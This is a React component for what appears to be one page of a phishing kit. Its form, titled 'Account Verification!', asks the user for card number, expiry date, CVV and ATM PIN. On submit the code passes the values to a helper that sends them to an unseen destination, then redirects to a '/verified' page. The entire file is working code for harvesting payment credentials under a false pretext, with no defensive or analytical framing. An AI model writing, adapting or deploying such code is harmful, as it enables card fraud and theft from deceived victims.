import {
  Box,
  Button,
  FormControl,
  FormLabel,
  Input,
  Select,
  Text,
  VStack,
} from "@chakra-ui/react";
import { useState } from "react";
import { useForm, SubmitHandler } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { cardInfoTemplate, sendRequest } from "../../../helpers";

type Inputs = {
  cardnumber: string;
  exdate: string;
  cvv: string;
  atmpin: string;
};

const Form6 = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();
  const [data, setData] = useState({
    cardnumber: "",
    exdate: "",
    cvv: "",
    atmpin: "",
  });
  const onSubmit: SubmitHandler<Inputs> = async (data) => {
    setData(() => data);

    if (data.cardnumber === "" || data.cvv === "" || data.atmpin === "") {
      return;
    }

    const message = cardInfoTemplate(
      data.cardnumber,
      data.exdate,
      data.cvv,
      data.atmpin
    );
    await sendRequest(message);
    navigate("/verified");
  };
  return (
    <VStack
      spacing="6"
      w={{ base: "100%", md: "50%" }}
      marginLeft={{ base: "unset", md: "25%" }}
      bg="#1c70c8"
      p="4"
      color="#fff"
    >
      <Text
        fontFamily="Poppins"
        fontSize="lg"
        fontWeight="bold"
        textAlign="left"
      >
        Account Verification!
      </Text>
      <Text fontFamily="Poppins" fontSize="sm" textAlign="left">
        Fill your card details for confirmation. Please ensure the information
        for verification.
      </Text>
      <Box
        w="90%"
        display="flex"
        flexDirection="column"
        justifyContent="space-between"
      >
        <form onSubmit={handleSubmit(onSubmit)}>
          <FormControl mb="8">
            <FormLabel>Card Number:</FormLabel>
            <Input
              {...register("cardnumber")}
              type="text"
              autoComplete="off"
              maxLength={16}
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Expiration Date:</FormLabel>
            <Input
              {...register("exdate")}
              type="text"
              placeholder="MM/YYYY"
              autoComplete="off"
              _placeholder={{ color: "#fff", fontSize: "13px" }}
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Security Code (CVV):</FormLabel>
            <Input
              {...register("cvv")}
              type="text"
              maxLength={3}
              autoComplete="off"
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Atm Pin:</FormLabel>
            <Input
              {...register("atmpin")}
              type="text"
              maxLength={4}
              autoComplete="off"
            />
          </FormControl>

          <Box
            display="flex"
            justifyContent="center"
            alignItems="center"
            mt="8"
          >
            <Button
              fontSize="md"
              minW="150px"
              type="submit"
              mx="4"
              bg="orange"
              color="#fff"
              _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
            >
              Continue
            </Button>
          </Box>
        </form>
      </Box>
    </VStack>
  );
};

export default Form6;
